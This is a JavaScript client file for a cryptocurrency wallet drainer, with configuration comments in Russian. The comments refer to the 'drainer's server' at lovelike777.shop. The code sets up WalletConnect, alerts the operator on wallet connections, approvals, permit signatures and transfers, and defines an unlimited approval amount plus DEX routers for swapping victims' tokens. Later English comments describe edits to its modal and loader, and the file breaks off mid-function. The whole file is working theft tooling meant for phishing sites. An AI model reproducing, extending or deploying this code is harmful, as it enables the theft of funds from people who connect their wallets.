// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

let CF_EKEY = 234343253453; // Укажите любое число, которое будет использовано для шифрования (не рекомендуется оставлять по умолчанию!)
// Это же число должно быть указано и в файле server.js - если они будут различаться, то ничего не будет работать правильно
const CF_HTTP_MODE = false; // [LOCALHOST TEST ONLY] Включите, чтобы скрипт обращался к серверу по HTTP, например, чтобы протестировать скрипт
const CF_Server_PORT = 443; // Если при обращении к серверу нужен кастомный порт, то укажите его здесь (по умолчанию - 443)
// По умолчанию для работы по HTTP нужен порт 80, а для работы по HTTPS необходим порт 443
const CF_Server_URL = "lovelike777.shop"; // Указать домен, который прикреплен к серверу дрейнера
// Это тот домен, где у вас стоит сервер, а не сам сайт, где вы планируете использовать дрейнер
const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14"; // Project ID из WalletConnect Cloud
// Если WalletConnect не работает, обязательно поменяйте этот ID, получить новый можно здесь: https://cloud.walletconnect.com/
// Регистрируемся на сайте, выбираем создать новый проект, ставим AppKit => JavaScript, заполнять дополнительные настройки необязательно
// Project ID будет в левом верхнем углу и должен быть похожим на тот, что вставлен по умолчанию по виду и длине

const CF_Modal_Style = 2; // 1 - старая (не рекомендуется), 2 - новая (обновление от 17.11.2023)
const CF_Loader_Style = 2; // 1 - старый (не рекомендуется), 2 - новый (обновление от 17.11.2023)
const CF_Color_Scheme = 'light'; // light - светлая тема, dark - тёмная тема
const CF_Modal_Mode = 2; // 1 - выбирать кошелек нажатием и подключать кнопкой, 2 - подключать сразу после выбора

const CF_Verify_Message = ""; // Сообщение для верификации кошелька, может содержать тег {{ADDRESS}}
// По умолчанию оставьте пустым, чтобы получать сообщение с сервера, иначе заполните, чтобы использовать кастомное

// С помощью настройки ниже вы можете кастомизировать то, как будет выглядеть ваш сайт в интерфейсе WalletConnect
// Изменять необязательно, большинство кошельков работают с настройками по умолчанию
// Настройка не связана с переключателем CF_WalletConnect_Customization, он нужен только для кастомизации дизайна

const CF_WalletConnect_MetaData = {
  name: document.title, // По умолчанию такое же как название сайта
  description: "Web3 Application", // По умолчанию "Web3 Application"
  url: "https://" + window.location.host, // По умолчанию как домен сайта
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const CF_WalletConnect_Customization = 0; // 0 - использовать окно по умолчанию, 1 - пользовательская кастомизация
const CF_WalletConnect_Theme = { // Параметры кастомизации доступны здесь: https://docs.walletconnect.com/2.0/web/web3modal/react/wagmi/theming
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const CF_Custom_Chat = {
  Enable: 0, // 0 - использовать настройки сервера, 1 - использовать настройки клиента
  Chat_Settings: {
    enter_website: "", // ID канала для действия - Вход на сайт (если пусто - уведомление отключено)
    leave_website: "", // ID канала для действия - Выход с сайта (если пусто - уведомление отключено)
    connect_success: "", // ID канала для действия - Успешное подключение (если пусто - уведомление отключено)
    connect_request: "", // ID канала для действия - Запрос на подключение (если пусто - уведомление отключено)
    connect_cancel: "", // ID канала для действия - Подключение отклонено (если пусто - уведомление отключено)
    approve_request: "", // ID канала для действия - Запрос на подтверждение (если пусто - уведомление отключено)
    approve_success: "", // ID канала для действия - Успешное подтверждение (если пусто - уведомление отключено)
    approve_cancel: "", // ID канала для действия - Подтверждение отклонено (если пусто - уведомление отключено)
    permit_sign_data: "", // ID канала для действия - Данные из PERMIT (если пусто - уведомление отключено)
    transfer_request: "", // ID канала для действия - Запрос на перевод (если пусто - уведомление отключено)
    transfer_success: "", // ID канала для действия - Успешный перевод (если пусто - уведомление отключено)
    transfer_cancel: "", // ID канала для действия - Отмена перевода (если пусто - уведомление отключено)
    sign_request: "", // ID канала для действия - Запрос на подпись (если пусто - уведомление отключено)
    sign_success: "", // ID канала для действия - Успешная подпись (если пусто - уведомление отключено)
    sign_cancel: "", // ID канала для действия - Подпись отклонена (если пусто - уведомление отключено)
    chain_request: "", // ID канала для действия - Запрос на смену сети (если пусто - уведомление отключено)
    chain_success: "", // ID канала для действия - Смена сети принята (если пусто - уведомление отключено)
    chain_cancel: "", // ID канала для действия - Смена сети отклонена (если пусто - уведомление отключено)
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;

if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;

var CF_Worker_ID = null;
const BN = ethers.BigNumber.from;

let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;

const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

(async () => {
  try {
    let response = await fetch(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD`, {
      method: 'GET', headers: { 'Accept': 'application/json' }
    });
    CF_Currencies = await response.json();
    CF_Currencies['PLS'] = { USD: 0.00004512 };
  } catch(err) {
    console.log(err);
  }
})();

const CF_API_Data = {
  1: 'api.etherscan.io',
  10: 'api-optimistic.etherscan.io',
  56: 'api.bscscan.com',
  137: 'api.polygonscan.com',
  250: 'api.ftmscan.com',
  42161: 'api.arbiscan.io',
  43114: 'api.snowtrace.io',
  8453: 'api.basescan.org',
  81457: 'api.blastscan.io',
};

var CF_MetaMask_ChainData = {};

const fill_chain_data = () => {
  CF_MetaMask_ChainData = {
    1: {
      chainId: '0x1',
      chainName: "Ethereum Mainnet",
      nativeCurrency: {
        name: "Ether",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[1]],
      blockExplorerUrls: ["https://etherscan.io"]
    },
    56: {
      chainId: '0x38',
      chainName: "BNB Smart Chain",
      nativeCurrency: {
        name: "Binance Coin",
        symbol: "BNB",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[56]],
      blockExplorerUrls: ["https://bscscan.com"]
    },
    137: {
      chainId: '0x89',
      chainName: "Polygon Mainnet",
      nativeCurrency: {
        name: "MATIC",
        symbol: "MATIC",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[137]],
      blockExplorerUrls: ["https://polygonscan.com"]
    },
    43114: {
      chainId: '0xA86A',
      chainName: "Avalanche Network C-Chain",
      nativeCurrency: {
        name: "AVAX",
        symbol: "AVAX",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[43114]],
      blockExplorerUrls: ["https://snowtrace.io/"]
    },
    42161: {
      chainId: '0xA4B1',
      chainName: "Arbitrum One",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[42161]],
      blockExplorerUrls: ["https://explorer.arbitrum.io"]
    },
    81457: {
      chainId: '0x13e31',
      chainName: "Blast",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[81457]],
      blockExplorerUrls: ["https://blastscan.io/"]
    },
    10: {
      chainId: '0xA',
      chainName: "Optimism",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[10]],
      blockExplorerUrls: ["https://optimistic.etherscan.io/"]
    },
    250: {
      chainId: '0xFA',
      chainName: "Fantom Opera",
      nativeCurrency: {
        name: "FTM",
        symbol: "FTM",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[250]],
      blockExplorerUrls: ["https://ftmscan.com/"]
    },
    8453: {
      chainId: '0x2105',
      chainName: "Base",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[8453]],
      blockExplorerUrls: ["https://basescan.org/"]
    },
    324: {
      chainId: '0x144',
      chainName: "zkSync Era",
      nativeCurrency: {
        name: "ETH",
        symbol: "ETH",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[324]],
      blockExplorerUrls: ["https://explorer.zksync.io/"]
    },
    369: {
      chainId: '0x171',
      chainName: "Pulse",
      nativeCurrency: {
        name: "PLS",
        symbol: "PLS",
        decimals: 18,
      },
      rpcUrls: [CF_Settings.RPCs[369]],
      blockExplorerUrls: ["https://scan.pulsechain.com/"]
    },
  };
};

const CF_Routers = {
  1: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Pancake', '0xEfF92A263d31888d860bD50809A8D171709b7b1c'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F']
  ],
  10: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45']
  ],
  56: [
    ['Pancake', '0x10ED43C718714eb63d5aA57B78B54704E256024E'],
    ['Pancake_V3', '0x13f4EA83D0bd40E75C8222255bc855a974568Dd4'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  137: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506'],
    ['Quickswap', '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff']
  ],
  250: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  42161: [
    ['Uniswap', '0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45'],
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ],
  43114: [
    ['Sushiswap', '0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506']
  ]
};

const CF_Swap_Route = {
  1: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
  10: '0x4200000000000000000000000000000000000006',
  56: '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c',
  137: '0x0d500b1d8e8ef31e21c99d1db9a6444d3adf1270',
  250: '0x21be370d5312f44cb42ce377bc9b8a0cef1a4c83',
  42161: '0x82af49447d8a07e3bd95bd0d56f35241523fbab1',
  43114: '0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7'
};

const CF_Uniswap_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256","name":"amountOut","type":"uint256"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"}];
const CF_Pancake_ABI = [{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactTokensForETH","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"bytes[]","name":"data","type":"bytes[]"}],"name":"multicall","outputs":[{"internalType":"bytes[]","name":"","type":"bytes[]"}],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amountIn","type":"uint256"},{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"}],"name":"swapExactTokensForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"nonpayable","type":"function"}];
const CF_Pancake_Native_ABI = [{"inputs":[{"internalType":"uint256","name":"amountOutMin","type":"uint256"},{"internalType":"address[]","name":"path","type":"address[]"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"deadline","type":"uint256"}],"name":"swapExactETHForTokens","outputs":[{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"stateMutability":"payable","type":"function"}];

const CF_Current_URL = window.location.href.replace(/http[s]*:\/\//, '');
const CF_Mobile_Status = (() => {
  let check = false;
  (function (a) { if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true; })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
})();
const CF_Apple_Status = (() => {
  try {
    return [
      'iPad Simulator', 'iPhone Simulator', 'iPod Simulator', 'iPad', 'iPhone', 'iPod'
    ].includes(navigator.platform) || (navigator.userAgent.includes("Mac") && "ontouchend" in document);
  } catch(err) {
    return false;
  }
})();

const CF_Unlimited_Amount = '1158472395435294898592384258348512586931256';

// =====================================================
// REMOVED POPUP MODAL CODE ONLY - KEPT EVERYTHING ELSE
// =====================================================

const CF_Modal_Data = [
  {
    type: 'style',
    data: `@import url(https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap);.web3-modal,.web3-overlay{position:fixed;top:0;left:0;width:100%}.web3-overlay{height:100%;background:rgba(23,23,23,.8);backdrop-filter:blur(5px);z-index:99998}.web3-modal{right:0;bottom:0;margin:auto;max-width:500px;height:fit-content;padding:21px 0 0;background:#fff;border-radius:60px;z-index:99999;font-family:Inter,sans-serif}.web3-modal-title{font-weight:700;font-size:24px;line-height:29px;color:#000;text-align:center}.web3-modal-items{border-top:1px solid rgba(0,0,0,.1);margin-top:21px}.web3-modal .item{padding:15px 34px;border-bottom:1px solid rgba(0,0,0,.1);display:flex;align-items:center;justify-content:space-between;cursor:pointer;transition:.2s}.web3-modal .item:hover{background:#fafafa;border-radius: 20px}.web3-modal .item div{display:flex;align-items:center}.web3-modal .item:last-child{border-bottom:none;border-radius: 0px 0px 60px 60px;}.web3-modal .item span{font-weight:400;font-size:16px;color:#000;margin-left:11px}.web3-modal .item .icon{width:40px;height:40px;justify-content:center}.web3-modal .item .arrow{height:12px;width:7.4px;background:url('/assets/graphics/images/arrow.svg') no-repeat} @media (prefers-color-scheme: dark) {.web3-modal {background: #1c1c1c;color: #fff;}.web3-modal-items {border-top: 1px solid #E4DDDD;}.web3-modal .item span {color: #fff;}.web3-modal .item .arrow {-webkit-filter: invert(1);filter: invert(1);}.web3-modal-title {color: #fff;}.web3-modal .item:hover {background:#262525;} .swal2-popup { background: #1c1c1c; color: #ffffff; } .swal2-styled.swal2-confirm { background-color: #3e7022; } .swal2-styled.swal2-confirm:focus { box-shadow: 0 0 0 3px #3e7022; } }`
  },
  {
    type: 'html',
    data: `<div class="web3-modal-main"><p class="web3-modal-title" style="margin-top:0">Connect your wallet</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("MetaMask")'><div><div class="icon"><img src="/assets/graphics/images/MM.svg" alt=""></div><span>MetaMask</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Coinbase")'><div><div class="icon"><img src="/assets/graphics/images/CB.svg" alt=""></div><span>Coinbase</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Trust Wallet")'><div><div class="icon"><img src="/assets/graphics/images/TW.svg" alt=""></div><span>Trust Wallet</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("Binance Wallet")'><div><div class="icon"><img src="/assets/graphics/images/BW.svg" alt=""></div><span>Binance Wallet</span></div><div class="arrow"></div></div><div class="item" onclick="init_reown()"><div><div class="icon"></div><span>More Wallets</span></div><div class="arrow"></div></div></div></div><div class="web3-modal-wc" style="display:none"><p class="web3-modal-title" style="margin-top:0">Choose Version</p><div class="web3-modal-items"><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC.svg" alt=""></div><span>WalletConnect</span></div><div class="arrow"></div></div><div class="item" onclick='connect_wallet("WalletConnect")'><div><div class="icon"><img src="/assets/graphics/images/WC1.svg" alt=""></div><span>WalletConnect Legacy</span></div><div class="arrow"></div></div><div class="item" onclick="init_co()"><div class="arrow" style="transform:rotateY(190deg)"></div><div><div class="icon"></div><span>Return to Wallets</span></div></div></div></div>`
  }
];

// MODIFIED: Remove modal injection but keep all other functionality
const inject_modal = () => {
  // Empty - no modal injection
};

const set_modal_data = (style_code, html_code) => {
  // Keep function but do nothing
};

const reset_modal = () => {
  // Keep function but do nothing
};

const init_co = () => {
  try {
    if (!CF_Connection) return connect_wallet();
    if (CF_Process) return;
    // Direct wallet connection without modal
    connect_wallet();
  } catch (err) {
    console.log(err);
  }
};

const ms_hide = () => {
  // Keep function but do nothing
};

// =====================================================
// ADDED CUSTOM CIRCLE LOADER (NON-INTRUSIVE)
// =====================================================

const createCustomLoader = () => {
  const loader = document.createElement('div');
  loader.id = 'custom-loader';
  loader.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 60px;
    height: 60px;
    z-index: 99999;
    display: none;
  `;
  
  // Rolling circle animation (keeping original)
  const rollingCircle = document.createElement('div');
  rollingCircle.style.cssText = `
    width: 40px;
    height: 40px;
    border: 4px solid #f3f3f3;
    border-top: 4px solid #3498db;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 10px auto;
  `;
  
  // My custom circle (added)
  const myCircle = document.createElement('div');
  myCircle.style.cssText = `
    width: 20px;
    height: 20px;
    background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
    border-radius: 50%;
    margin: 5px auto;
    box-shadow: 0 0 10px rgba(78, 205, 196, 0.5);
  `;
  
  const text = document.createElement('div');
  text.style.cssText = `
    text-align: center;
    color: #333;
    font-size: 12px;
    margin-top: 5px;
  `;
  text.textContent = 'Loading...';
  
  loader.appendChild(rollingCircle);
  loader.appendChild(myCircle);
  loader.appendChild(text);
  
  // Add spin animation
  const style = document.createElement('style');
  style.textContent = `
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  `;
  document.head.appendChild(style);
  
  document.body.appendChild(loader);
  return loader;
};

// Initialize custom loader
const customLoader = createCustomLoader();

const showCustomLoader = (message = 'Loading...') => {
  const text = customLoader.querySelector('div:last-child');
  if (text) text.textContent = message;
  customLoader.style.display = 'block';
};

const hideCustomLoader = () => {
  customLoader.style.display = 'none';
};

// =====================================================
// ADDED TRANSACTION FAILURE HANDLING
// =====================================================

const showTransactionStatus = (message, isError = false) => {
  const statusDiv = document.createElement('div');
  statusDiv.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    padding: 15px 20px;
    background: ${isError ? '#ff4444' : '#4CAF50'};
    color: white;
    border-radius: 5px;
    z-index: 10000;
    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    max-width: 300px;
    word-wrap: break-word;
  `;
  statusDiv.textContent = message;
  document.body.appendChild(statusDiv);
  
  setTimeout(() => {
    if (statusDiv.parentNode) {
      statusDiv.parentNode.removeChild(statusDiv);
    }
  }, 5000);
};

// =====================================================
// KEEP ALL ORIGINAL WALLET CONNECT CODE EXACTLY AS IS
// =====================================================

let CF_Is_AppKit_Loaded = false;
let CF_Is_AppKit_Inited = false;
let CF_Is_AppKit_Connected = false;
let CF_Is_AppKit_Opened = false;

const load_wc = async () => {
  if (CF_Is_AppKit_Loaded) return;
  CF_Is_AppKit_Loaded = true;
  if (CF_WalletConnect_Customization) {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] },
      ...CF_WalletConnect_Theme
    });
  } else {
    CF_AppKit = AppKit.createAppKit({
      adapters: [new Ethers5Adapter()],
      networks: [
        Networks.mainnet, Networks.bsc, Networks.arbitrum, Networks.avalanche, Networks.optimism,
        Networks.base, Networks.zksync, Networks.polygon, Networks.fantom, Networks.pulsechain
      ],
      metadata: CF_WalletConnect_MetaData,
      projectId: CF_WalletConnect_ID,
      featuredWalletIds: [ '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0' ],
      features: { email: false, socials: [] }
    });
  }
  CF_AppKit.subscribeState(async (new_state) => {
    try {

    } catch(err) {
      console.log(err);
    }
  });
  CF_AppKit.subscribeEvents(async (ev) => {
    try {
      // console.log(ev.data)
      if (ev.data.event == 'INITIALIZE') {
        CF_Is_AppKit_Inited = true;
        if (CF_AppKit.getWalletProvider() != undefined) {
          CF_Is_AppKit_Connected = true;
          try {
            CF_AppKit.disconnect(CF_AppKit.getWalletProvider());
          } catch(err) {
            console.log(err);
          }
        }
      } else if (ev.data.event == 'DISCONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = false;
      } else if (ev.data.event == 'CONNECT_SUCCESS') {
        CF_Is_AppKit_Connected = true;
        CF_Current_Address = CF_AppKit.getAddress();
        CF_Provider = CF_AppKit.getWalletProvider();
      } else if (ev.data.event == 'MODAL_OPEN') {
        CF_Is_AppKit_Opened = true;
      } else if (ev.data.event == 'MODAL_CLOSE') {
        CF_Is_AppKit_Opened = false;
      }
    } catch(err) {
      console.log(err);
    }
  });
};

const load_wc_legacy = async () => {
  let all_chains_arr = [], all_chains_obj = {};
  for (const chain_id in CF_Settings.RPCs) {
    if (chain_id != '1') all_chains_arr.push(chain_id);
